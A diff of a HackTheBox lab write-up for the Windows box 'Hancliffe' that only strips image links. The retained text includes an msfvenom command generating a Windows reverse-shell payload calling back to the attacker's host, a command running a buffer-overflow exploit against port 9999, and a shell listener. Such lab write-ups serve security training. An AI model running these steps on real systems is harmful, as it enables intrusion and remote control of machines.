@@ -4,8 +4,6 @@ date: 2026-11-03 07:00:00 -0500
 categories: [HackTheBox, Windows]
 tags: [hackthebox, windows, hard, buffer-overflow, reverse-engineering, hardcoded-credentials, socket-reuse, exploit-dev]
 description: "Hancliffe is a Hard Windows box whose intended path threads a reverse-proxy normalization bypass into a Nuxeo template-injection RCE and a chain of credential theft. But a custom service listening on port 9999 — running as Administrator and reachable from the network — has a classic stack buffer overflow, so a socket-reuse exploit gives a privileged shell directly. This post covers recon through the user flag."
-image:
-    path: /assets/Images/hancliffe-004_exploit_bof-9999.png
 ---
 
 ## Overview
@@ -45,7 +43,6 @@ Generate a null-free Windows reverse-shell payload (the protocol is null-termina
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.13 LPORT=4444 EXITFUNC=thread -b "\x00" -f python -v shellcode > sc.py
 ```
 
-![msfvenom](/assets/Images/hancliffe-001_exploit_msfvenom.png)
 
 Catch the shell with a file-fed listener so commands can be driven into the non-interactive `cmd.exe`:
 
@@ -60,11 +57,9 @@ The exploit logs in with the recovered credentials, sends the overflow (offset 6
 python3 sploit.py 10.129.96.116 9999
 ```
 
-![BOF exploit](/assets/Images/hancliffe-004_exploit_bof-9999.png)
 
 The connection lands a shell:
 
-![shell](/assets/Images/hancliffe-002_foothold_shell.png)
 
 ```bash
 printf 'whoami\n' >> /tmp/hc_cmds.txt
@@ -79,7 +74,6 @@ Because the vulnerable service runs as Administrator, the overflow alone is a pr
 type C:\Users\clara\Desktop\user.txt   # HTB{...}
 ```
 
-![user flag](/assets/Images/hancliffe-005_foothold_user-flag.png)
 
 The user flag belongs to `clara` and is readable immediately from the shell.
 
